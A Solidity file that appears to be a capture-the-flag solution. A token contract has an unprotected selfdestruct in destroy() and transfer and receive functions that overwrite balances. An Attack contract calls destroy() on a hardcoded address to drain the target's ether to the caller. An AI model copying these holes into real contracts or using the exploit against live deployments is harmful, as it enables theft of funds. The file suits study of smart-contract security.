// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/master/contracts/utils/math/SafeMath.sol";

contract SimpleToken {

    using SafeMath for uint256;
    // public variables
    string public name;
    mapping (address => uint) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply)  {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value.mul(10);
    }

    // allow transfers of tokens
    function transfer(address _to, uint _amount) public { 
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

contract Attack{
    SimpleToken target = SimpleToken(payable(0x935DFE189FC4b77dBEB6a1a2be453088AaA1a016));

    function attack() public {
        target.destroy(payable(msg.sender));
    }
}